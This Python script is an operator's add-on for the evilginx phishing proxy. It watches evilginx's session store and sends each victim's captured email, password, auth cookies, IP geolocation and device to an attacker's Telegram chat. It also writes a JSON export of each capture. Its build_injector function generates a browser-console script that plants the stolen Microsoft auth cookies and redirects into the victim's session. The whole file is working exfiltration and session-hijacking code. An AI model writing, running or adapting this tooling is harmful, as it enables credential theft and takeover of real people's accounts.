#!/usr/bin/env python3
"""Telegram notifier for evilginx 3.3 captures.

Watches the evilginx session store (~/.evilginx/data.db, RESP-style JSON)
for sessions with captured credentials / auth cookies and posts them to a
Telegram chat. Sends one message per session when credentials arrive, then
edits the same message when the auth cookies are captured.

Each notification includes the victim's IP address, geolocation (country /
city / region), ISP (ip-api.com, cached) and device (parsed from the
User-Agent: device type / OS / browser).

Stdlib only - no pip installs required.

Usage:
    TG_BOT_TOKEN=123456:ABC-DEF TG_CHAT_ID=987654 python3 telegram_notify.py

Options:
    --db PATH       path to evilginx data.db  (default ~/.evilginx/data.db)
    --config PATH   path to evilginx config.json (lure labels)  (default ~/.evilginx/config.json)
    --state PATH    notifier state file       (default ~/.evilginx/telegram_state.json)
    --interval N    poll interval in seconds  (default 5)
    --once          check once and exit (also useful to list current captures)
    --no-injector   do not send the cookie-injector script attachment
    --bot-api URL   self-hosted Telegram Bot API endpoint (optional)

Attachments per capture: <email>.json (full raccoon-style export incl. browser
fingerprint / geo / cookie validity) and <email>-injector.txt (console paste that
plants the captured auth cookies on the real login page to hijack the session).

Environment:
    TG_BOT_TOKEN    bot token from @BotFather
    TG_CHAT_ID      chat id to deliver to (use @userinfobot to find yours)
    TG_BOT_API      optional self-hosted Bot API base URL
"""

import argparse
import base64
import datetime
import hashlib
import ipaddress
import json
import os
import sys
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

DEFAULT_DB = os.path.expanduser("~/.evilginx/data.db")
DEFAULT_STATE = os.path.expanduser("~/.evilginx/telegram_state.json")
DEFAULT_API = "https://api.telegram.org"


def resp_sessions(path):
    """Parse the RESP-style data.db and return a list of session dicts."""
    sessions = []
    with open(path, "rb") as f:
        lines = f.read().decode("utf-8", "replace").replace("\r", "").split("\n")
    i = 0
    while i < len(lines):
        if lines[i].startswith("*"):
            i += 1
            if i + 1 < len(lines) and lines[i].startswith("$3") and lines[i + 1] == "set":
                i += 2
                if i < len(lines) and lines[i].startswith("$"):
                    i += 1
                    key = lines[i] if i < len(lines) else ""
                    i += 1
                    if i < len(lines) and lines[i].startswith("$"):
                        i += 1
                        val = lines[i] if i < len(lines) else ""
                        i += 1
                        if key.startswith("sessions:"):
                            try:
                                sessions.append(json.loads(val))
                            except (ValueError, TypeError):
                                pass
        else:
            i += 1
    return sessions


def format_cookies(tokens):
    """tokens: {domain: {name: {Name, Value, Path, HttpOnly}}}"""
    lines = []
    for domain in sorted(tokens):
        lines.append("  " + domain)
        for name in sorted(tokens[domain]):
            ck = tokens[domain][name]
            flags = []
            if ck.get("HttpOnly"):
                flags.append("HttpOnly")
            if ck.get("Secure"):
                flags.append("Secure")
            extra = " (" + ", ".join(flags) + ")" if flags else ""
            lines.append("    %s = %s%s" % (name, ck.get("Value", ""), extra))
    return "\n".join(lines)


_GEO_CACHE = {}


def geo_lookup(ip):
    """Resolve an IP to country/city/region/ISP via ip-api.com (cached)."""
    if ip in _GEO_CACHE:
        return _GEO_CACHE[ip]
    result = {"country": "?", "city": "?", "region": "?", "isp": "?"}
    try:
        addr = ipaddress.ip_address(ip.split(",")[0].strip())
        if addr.is_private or addr.is_loopback or addr.is_link_local:
            result = {"country": "Local", "city": "", "region": "", "isp": "Local network"}
        else:
            url = (
                "http://ip-api.com/json/%s"
                "?fields=status,country,countryCode,city,regionName,isp,lat,lon,"
                "timezone,org,as,asname,zip&lang=en" % ip
            )
            with urllib.request.urlopen(url, timeout=5) as resp:
                data = json.loads(resp.read().decode("utf-8"))
            if data.get("status") == "success":
                result = {
                    "country": data.get("country") or "?",
                    "city": data.get("city") or "?",
                    "region": data.get("regionName") or "?",
                    "isp": data.get("isp") or "?",
                    "countryCode": data.get("countryCode"),
                    "lat": data.get("lat"),
                    "lon": data.get("lon"),
                    "timezone": data.get("timezone"),
                    "org": data.get("org"),
                    "as": data.get("as"),
                    "asname": data.get("asname"),
                    "zip": data.get("zip"),
                }
    except Exception:
        pass
    _GEO_CACHE[ip] = result
    return result


def parse_device(ua):
    """Derive device type / OS / browser from a User-Agent string."""
    l = (ua or "").lower()
    if "iphone" in l:
        device = "iPhone"
    elif "ipad" in l:
        device = "iPad"
    elif "android" in l:
        tablet = any(k in l for k in ("tablet", "sm-t", "kf", "gt-p"))
        device = "Android tablet" if tablet else "Android phone"
    elif "windows" in l:
        device = "Windows PC"
    elif "mac os" in l or "macintosh" in l:
        device = "Mac"
    elif "linux" in l:
        device = "Linux"
    elif "curl" in l or "wget" in l or "python" in l or "go-http" in l:
        device = "CLI/bot"
    else:
        device = "Unknown"
    if "edg/" in l:
        browser = "Edge"
    elif "crios" in l:
        browser = "Chrome (iOS)"
    elif "fxios" in l:
        browser = "Firefox (iOS)"
    elif "chrome" in l and "chromium" not in l:
        browser = "Chrome"
    elif "firefox" in l:
        browser = "Firefox"
    elif "opr/" in l:
        browser = "Opera"
    elif "samsungbrowser" in l:
        browser = "Samsung Internet"
    elif "safari" in l:
        browser = "Safari"
    else:
        browser = "?"
    return "%s (%s)" % (device, browser)


def format_session(s):
    """Render a session as a compact plain-text Telegram message."""
    ip = s.get("remote_addr") or "-"
    geo = geo_lookup(ip)
    loc_parts = []
    if geo.get("city") and geo["city"] != "?":
        loc_parts.append(geo["city"])
    if geo.get("region") and geo["region"] not in ("?", geo["city"]):
        loc_parts.append(geo["region"])
    loc_parts.append(geo.get("country", "?"))
    loc = ", ".join(loc_parts)
    ua = s.get("useragent") or "-"
    lines = [
        "New capture: %s" % s.get("phishlet", "?"),
        "User: %s" % (s.get("username") or "-"),
        "Email: %s" % (s.get("username") or "-"),
        "Pass: %s" % (s.get("password") or "-"),
        "IP: %s" % ip,
        "Country: %s" % (geo.get("country") or "?"),
        "City: %s" % (geo.get("city") or "?"),
        "Device: %s" % parse_device(ua),
    ]
    cookie_names = [ck.get("Name") or n for dom, cks in (s.get("tokens") or {}).items() for n, ck in cks.items()]
    has_session = any(n in AUTH_COOKIES for n in cookie_names)
    if not has_session:
        lines.append("WARNING: creds only - no session tokens captured")
    return "\n".join(lines)


AUTH_COOKIES = ("ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT", "MSPOK")


def session_filename(s):
    """File name for the JSON export, e.g. 'mstewart@tindallriley.com.json'."""
    name = (s.get("username") or "").strip()
    if name:
        return name + ".json"
    return "capture-%s.json" % (s.get("session_id", "unknown")[:12])


def injector_filename(s):
    """File name for the cookie-injector script, e.g. 'mstewart@tindallriley.com-injector.txt'."""
    name = (s.get("username") or "").strip()
    if name:
        return name + "-injector.txt"
    return "capture-%s-injector.txt" % (s.get("session_id", "unknown")[:12])


def iso_time(ts):
    return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(ts or 0)) + ".000000Z"


def now_iso():
    return datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def sid_hex(sid):
    """First 32 hex chars of a session id, no dashes (reference export format)."""
    s = (sid or "").replace("-", "")
    return (s[:32]) if len(s) >= 32 else s


def sid_uuid(sid):
    """Render a session id as a UUID v4-style string."""
    s = (sid or "").replace("-", "")
    if len(s) >= 32:
        s = s[:32]
        return "%s-%s-%s-%s-%s" % (s[0:8], s[8:12], s[12:16], s[16:20], s[20:32])
    return s or ""


def ua_family(ua, kind):
    """Derive os/browser family name from a User-Agent string."""
    l = (ua or "").lower()
    if kind == "os":
        if "windows" in l:
            return "windows"
        if "mac os" in l or "macintosh" in l:
            return "macos"
        if "android" in l:
            return "android"
        if "iphone" in l or "ipad" in l or "ios" in l:
            return "ios"
        if "linux" in l:
            return "linux"
        return "unknown"
    if "edg/" in l:
        return "edge"
    if "crios" in l or "fxios" in l:
        return "mobile"
    if "chrome" in l and "chromium" not in l:
        return "chrome"
    if "firefox" in l:
        return "firefox"
    if "opr/" in l:
        return "opera"
    if "safari" in l:
        return "safari"
    return "unknown"


def ip_details(ip):
    """Full ip-api details dict for the JSON export (cached)."""
    geo = geo_lookup(ip)

    def s(v):
        return str(v) if v is not None and v != "" else None

    return {
        "ip_address": ip,
        "proxy_type": None,
        "updated_at": now_iso() if geo.get("country") != "Local" else None,
        "country_code": geo.get("countryCode"),
        "city": geo.get("city"),
        "isp": geo.get("isp"),
        "latitude": s(geo.get("lat")),
        "longitude": s(geo.get("lon")),
        "country_name": geo.get("country"),
        "zip_code": geo.get("zip"),
        "time_zone": geo.get("timezone"),
        "organization": geo.get("org"),
        "autonomous_system_organization": geo.get("asname"),
        "autonomous_system_number": geo.get("as"),
        "potential_bot": False,
    }


PRIMARY_AUTH = ("ESTSAUTH", "ESTSAUTHPERSISTENT")


def origin_is_valid(phishlet, cookie_names):
    """Reference semantics: only origins holding the primary auth cookies are 'valid'.
    For Microsoft flows that's ESTSAUTH/ESTSAUTHPERSISTENT; otherwise any AUTH_COOKIES."""
    if str(phishlet or "").startswith("microsoft"):
        return any(n in PRIMARY_AUTH for n in cookie_names)
    return any(n in AUTH_COOKIES for n in cookie_names)


def bfp_details(s):
    """Decode the browser fingerprint captured via the X-Bfp http auth token."""
    raw = (s.get("http_tokens") or {}).get("bfp")
    if not raw:
        return {}
    try:
        fp = json.loads(base64.b64decode(raw).decode("utf-8"))
        fp["potential_bot"] = False
        return fp
    except Exception:
        return {}


def load_lures(config_path):
    """Load {path: lure} from evilginx config.json."""
    try:
        with open(config_path) as f:
            cfg = json.load(f)
        return {l.get("path") or "": l for l in cfg.get("lures") or []}
    except Exception:
        return {}


def campaign_label(s, lures):
    """Lure label for a session: lure.info (or path) when the landing path matches."""
    landing = s.get("landing_url") or ""
    path = urllib.parse.urlparse(landing).path or ""
    lure = lures.get(path)
    if lure:
        return lure.get("info") or lure.get("path") or s.get("phishlet")
    return s.get("phishlet")


def injector_cookies(s):
    """Pick the origin group holding the session's auth cookies (reference behavior)."""
    toks = s.get("tokens") or {}
    best = None
    for dom, cks in toks.items():
        names = [ck.get("Name") or n for n, ck in cks.items()]
        score = sum(1 for n in names if n in PRIMARY_AUTH) * 100
        score += sum(1 for n in names if n in AUTH_COOKIES)
        if best is None or score > best[0]:
            best = (score, dom, cks)
    if best is None or best[0] == 0:
        return [], ""
    return list(best[2].values()), best[1]


def injector_redirect(s, origin):
    """Where the injector sends the browser after planting the cookies."""
    if str(s.get("phishlet") or "").startswith("microsoft"):
        return "https://login.microsoftonline.com"
    return "https://" + origin.lstrip(".")


def build_injector(s):
    """Build the browser-console session-hijack script from a captured session.

    Paste it into DevTools while on the real login page: it plants the captured
    auth cookies and redirects into the victim's session.
    """
    cookies, origin = injector_cookies(s)
    if not cookies:
        return None
    now_ms = int(time.time() * 1000)
    cj = []
    for ck in cookies:
        cj.append({
            "name": ck.get("Name") or "",
            "value": ck.get("Value") or "",
            "domain": origin,
            "expirationDate": now_ms + 31536000000,
            "hostOnly": False,
            "httpOnly": bool(ck.get("HttpOnly")),
            "path": ck.get("Path") or "/",
            "sameSite": "none",
            "secure": True,
            "session": True,
            "storeId": None,
        })
    cj_json = json.dumps(cj, ensure_ascii=False, separators=(",", ":"))
    redirect = injector_redirect(s, origin)
    redirect_b64 = base64.b64encode(redirect.encode("utf-8")).decode("utf-8")
    return (
        "let ipaddress = `%s`;\n"
        "let email = `%s`;\n"
        "let password = `%s`;\n"
        "!function(){let e=JSON.parse(`%s`);"
        "for(let o of e)document.cookie=`${o.name}=${o.value};Max-Age=31536000;"
        "${o.path?`path=${o.path};`:''}${o.domain?`${o.path?'':'path=/'}domain=${o.domain};`:''}"
        "Secure;SameSite=None`;window.location.href=atob('%s')}();\n"
    ) % (
        s.get("remote_addr") or "",
        s.get("username") or "",
        s.get("password") or "",
        cj_json,
        redirect_b64,
    )


def build_export(s, lures=None, created_at=None):
    """Full session data as a dict for the JSON export file (raccoon-style)."""
    sid = s.get("session_id") or ""
    ts_c = s.get("create_time") or 0
    ts_u = s.get("update_time") or ts_c
    toks = s.get("tokens") or {}
    cookies_total = sum(len(v) for v in toks.values())
    origin = "login.microsoftonline.com" if s.get("phishlet") == "microsoft-online" else "login.live.com"

    captured = []
    cid = 1
    def add_cap(internal_map_to, value):
        nonlocal cid
        captured.append({
            "id": cid,
            "session": sid_hex(sid),
            "origin": origin,
            "internal_map_to": internal_map_to,
            "data": {"captured": value},
            "created_at": iso_time(ts_c),
        })
        cid += 1
    if s.get("username"):
        add_cap("login", s["username"])
    if s.get("password"):
        add_cap("password", s["password"])
    for k, v in (s.get("custom") or {}).items():
        add_cap(k, v)

    captured_cookies = []
    for dom, cks in sorted(toks.items()):
        cookie_list = []
        names = []
        for name in sorted(cks):
            ck = cks[name] or {}
            cookie_list.append({
                "name": ck.get("Name") or name,
                "path": ck.get("Path") or "/",
                "value": ck.get("Value") or "",
                "domain": dom,
                "secure": ck.get("Secure"),
                "max_age": None,
                "httponly": ck.get("HttpOnly"),
                "samesite": None,
            })
            names.append(ck.get("Name") or name)
        captured_cookies.append({
            "origin": dom.lstrip("."),
            "cookies": cookie_list,
            "local_storage": [],
            "created_at": iso_time(ts_c),
            "updated_at": iso_time(ts_u),
            "is_valid": origin_is_valid(s.get("phishlet"), names),
        })

    landing = s.get("landing_url") or ""
    from_domain = landing
    try:
        host = urllib.parse.urlparse(landing).hostname or ""
        if host.count(".") >= 2:
            from_domain = host.split(".", 1)[1]
        elif host:
            from_domain = host
    except Exception:
        pass

    return {
        "id": sid_uuid(sid),
        "ip_details": ip_details(s.get("remote_addr") or ""),
        "bfp_details": bfp_details(s),
        "os_details": {"id": None, "md5": hashlib.md5(ua_family(s.get("useragent"), "os").encode()).hexdigest(), "family": ua_family(s.get("useragent"), "os")},
        "browser_details": {"id": None, "md5": hashlib.md5(ua_family(s.get("useragent"), "browser").encode()).hexdigest(), "family": ua_family(s.get("useragent"), "browser")},
        "filter_results": [],
        "from_domain": from_domain,
        "from_campaign_label": campaign_label(s, lures or {}),
        "last_captured_login": s.get("username"),
        "created_at": created_at or now_iso(),
        "last_seen_at": now_iso(),
        "is_logged_in": any(origin_is_valid(s.get("phishlet"), list(cks)) for dom2, cks in toks.items()),
        "cookies_count": cookies_total,
        "captured_data_count": len(captured),
        "captured_cookies": captured_cookies,
        "captured_data": captured,
    }


class Telegram:
    def __init__(self, token, chat_id, api=DEFAULT_API):
        self.token = token
        self.chat_id = chat_id
        self.api = api.rstrip("/")

    def _call(self, method, payload):
        url = "%s/bot%s/%s" % (self.api, self.token, method)
        data = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            url, data=data, headers={"Content-Type": "application/json"}
        )
        try:
            with urllib.request.urlopen(req, timeout=15) as resp:
                body = json.loads(resp.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            body = json.loads(e.read().decode("utf-8", "replace"))
        except Exception as e:
            raise RuntimeError("telegram request failed: %s" % e)
        if not body.get("ok"):
            raise RuntimeError("telegram error: %s" % body)
        return body["result"]

    def send(self, text):
        return self._call("sendMessage", {"chat_id": self.chat_id, "text": text})["message_id"]

    def send_document(self, path, filename=None, caption=""):
        boundary = "----evilginx%s" % uuid.uuid4().hex
        fields = [("chat_id", self.chat_id)]
        if caption:
            fields.append(("caption", caption))
        body = b""
        for name, val in fields:
            body += (
                b"--" + boundary.encode() + b"\r\n"
                b'Content-Disposition: form-data; name="' + name.encode() + b'"\r\n\r\n'
                + val.encode("utf-8") + b"\r\n"
            )
        fname = filename or os.path.basename(path)
        with open(path, "rb") as f:
            fdata = f.read()
        body += (
            b"--" + boundary.encode() + b"\r\n"
            b'Content-Disposition: form-data; name="document"; filename="'
            + fname.encode("utf-8") + b'"\r\n'
            b"Content-Type: application/json\r\n\r\n" + fdata + b"\r\n"
        )
        body += b"--" + boundary.encode() + b"--\r\n"
        url = "%s/bot%s/sendDocument" % (self.api, self.token)
        req = urllib.request.Request(
            url,
            data=body,
            headers={"Content-Type": "multipart/form-data; boundary=" + boundary},
        )
        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                rbody = json.loads(resp.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            rbody = json.loads(e.read().decode("utf-8", "replace"))
        except Exception as e:
            raise RuntimeError("telegram request failed: %s" % e)
        if not rbody.get("ok"):
            raise RuntimeError("telegram error: %s" % rbody)
        return rbody["result"]

    def edit(self, message_id, text):
        return self._call(
            "editMessageText",
            {"chat_id": self.chat_id, "message_id": message_id, "text": text},
        )


def load_state(path):
    try:
        with open(path) as f:
            return json.load(f)
    except (OSError, ValueError):
        return {}


def save_state(path, state):
    tmp = path + ".tmp"
    with open(tmp, "w") as f:
        json.dump(state, f, indent=2)
    os.replace(tmp, path)


def main():
    ap = argparse.ArgumentParser(description="evilginx -> Telegram capture notifier")
    ap.add_argument("--db", default=DEFAULT_DB, help="path to evilginx data.db")
    ap.add_argument("--config", default=os.path.expanduser("~/.evilginx/config.json"), help="path to evilginx config.json (for lure labels)")
    ap.add_argument("--state", default=DEFAULT_STATE, help="state file path")
    ap.add_argument("--interval", type=int, default=5, help="poll interval seconds")
    ap.add_argument("--once", action="store_true", help="check once and exit")
    ap.add_argument("--no-injector", action="store_true", help="do not send the cookie-injector script")
    ap.add_argument("--export-grace", type=int, default=60, help="seconds to wait for cookies before exporting a creds-only capture (default 60)")
    ap.add_argument("--bot-api", default=os.environ.get("TG_BOT_API", DEFAULT_API))
    args = ap.parse_args()

    token = os.environ.get("TG_BOT_TOKEN")
    chat_id = os.environ.get("TG_CHAT_ID")
    if not token or not chat_id:
        print("error: set TG_BOT_TOKEN and TG_CHAT_ID environment variables", file=sys.stderr)
        sys.exit(1)

    tg = Telegram(token, chat_id, args.bot_api)
    state = load_state(args.state)
    lures = load_lures(args.config)

    print("watching %s -> chat %s (poll %ds)" % (args.db, chat_id, args.interval), flush=True)

    try:
        tg.send("evilginx notifier online - watching %s" % args.db)
        print("test message sent to chat %s" % chat_id, flush=True)
    except RuntimeError as e:
        print("error: cannot reach chat %s: %s" % (chat_id, e), flush=True)
        sys.exit(1)

    while True:
        try:
            sessions = resp_sessions(args.db)
        except OSError as e:
            print("warn: cannot read db: %s" % e, flush=True)
            sessions = []

        best = {}
        for s in sessions:
            if not isinstance(s, dict) or not s.get("session_id"):
                continue
            sid = s["session_id"]
            cur = best.get(sid)
            if cur is None or (s.get("update_time") or 0) >= (cur.get("update_time") or 0):
                best[sid] = s

        for sid, s in best.items():
            if not s.get("username") and not s.get("password"):
                continue
            entry = state.get(sid, {})
            if entry.get("done"):
                continue

            text = format_session(s)
            has_tokens = bool(s.get("tokens"))
            try:
                if "message_id" in entry:
                    if text == entry.get("last_text") and not has_tokens:
                        state[sid] = entry
                        continue
                    tg.edit(entry["message_id"], text)
                    entry["done"] = True
                    entry["last_text"] = text
                    print("updated session %s" % sid[:16], flush=True)
                else:
                    mid = tg.send(text)
                    entry["message_id"] = mid
                    entry["first_seen"] = entry.get("first_seen") or time.time()
                    entry["last_text"] = text
                    # cookies may arrive after creds; keep editing until we saw them
                    entry["done"] = has_tokens
                    print("notified session %s" % sid[:16], flush=True)
            except RuntimeError as e:
                print("warn: %s" % e, flush=True)
                continue

            if not entry.get("file_sent"):
                if not has_tokens and time.time() - entry.get("first_seen", 0) < args.export_grace:
                    state[sid] = entry
                    continue
                try:
                    export = build_export(s, lures=lures, created_at=entry.get("created_at"))
                    tmp = os.path.join(
                        tempfile.gettempdir(),
                        "evilginx_tg_%s.json" % uuid.uuid4().hex[:12],
                    )
                    with open(tmp, "w") as f:
                        json.dump(export, f, indent=2)
                    fname = session_filename(s)
                    tg.send_document(tmp, filename=fname, caption=text)
                    entry["file_sent"] = True
                    entry["export_has_tokens"] = has_tokens
                    entry["created_at"] = export.get("created_at")
                    print("file sent for session %s: %s" % (sid[:16], fname), flush=True)
                except RuntimeError as e:
                    print("warn: %s" % e, flush=True)
                finally:
                    if os.path.exists(tmp):
                        os.remove(tmp)
            elif has_tokens and not entry.get("export_has_tokens"):
                try:
                    export = build_export(s, lures=lures, created_at=entry.get("created_at"))
                    tmp = os.path.join(
                        tempfile.gettempdir(),
                        "evilginx_tg_%s.json" % uuid.uuid4().hex[:12],
                    )
                    with open(tmp, "w") as f:
                        json.dump(export, f, indent=2)
                    fname = session_filename(s)
                    tg.send_document(tmp, filename=fname, caption=text)
                    entry["export_has_tokens"] = True
                    print("file resent for session %s with cookies" % sid[:16], flush=True)
                except RuntimeError as e:
                    print("warn: %s" % e, flush=True)
                finally:
                    if os.path.exists(tmp):
                        os.remove(tmp)

            if not args.no_injector and not entry.get("injector_sent") and has_tokens:
                try:
                    inj = build_injector(s)
                    if inj:
                        itmp = os.path.join(
                            tempfile.gettempdir(),
                            "evilginx_tg_%s.txt" % uuid.uuid4().hex[:12],
                        )
                        with open(itmp, "w") as f:
                            f.write(inj)
                        tg.send_document(itmp, filename=injector_filename(s))
                        entry["injector_sent"] = True
                        print("injector sent for session %s" % sid[:16], flush=True)
                except RuntimeError as e:
                    print("warn: %s" % e, flush=True)
                finally:
                    if os.path.exists(itmp):
                        os.remove(itmp)

            state[sid] = entry
            save_state(args.state, state)

        if args.once:
            break
        time.sleep(args.interval)


if __name__ == "__main__":
    main()